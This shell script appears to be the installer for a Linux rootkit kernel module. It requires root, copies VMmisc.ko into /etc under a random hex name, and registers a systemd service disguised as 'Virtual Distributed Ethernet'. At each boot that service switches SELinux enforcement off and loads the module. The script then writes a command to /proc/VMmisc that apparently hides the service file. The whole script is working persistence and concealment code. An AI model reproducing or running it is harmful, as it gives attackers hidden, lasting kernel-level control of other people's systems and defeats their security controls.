#!/bin/sh
###
###

echo -e "Installing\n"

if [ `whoami` != "root" ]; then
   echo -e "\n[E] must be root"
   exit 1
fi

echo ""

#--------------------------------------------------------------------
Pwd_Dir=$(pwd)
Rand=$(cat /dev/urandom | head -c 4 | hexdump '-e"%x"')

hide_tag=$Rand


src_ko=VMmisc.ko
# xxx, "/etc/"
dst_ko=/etc/$hide_tag

ko_ctl_=/proc/VMmisc


start_file=$hide_tag.service


cat > $Pwd_Dir/tmp2 <<EOF
[Unit]
Description=Virtual Distributed Ethernet

[Service]
Type=forking
ExecStart=/bin/bash -c 'echo 0 > /sys/fs/selinux/enforce ; /sbin/insmod ${dst_ko} fh="${hide_tag}"'
Restart=on-abort

[Install]
WantedBy=multi-user.target


EOF



_install () {
	cp $Pwd_Dir/tmp2 /etc/systemd/system/$start_file

	cp $Pwd_Dir/$src_ko $dst_ko
	
	
	if [ -f /etc/systemd/system/$start_file ]; then

		systemctl enable $start_file

		systemctl start $start_file
		
		
		echo " >> ko path: "${dst_ko}""
		echo " >> start path: /etc/systemd/system/"${start_file}""
		
		echo "+f"${start_file}"" > $ko_ctl_
		
		echo -e "    --- ok ---    \n"
	fi
	
	exit 0;
}


if [ -x /etc/systemd/system/ ]; then
   _install
fi


exit 0

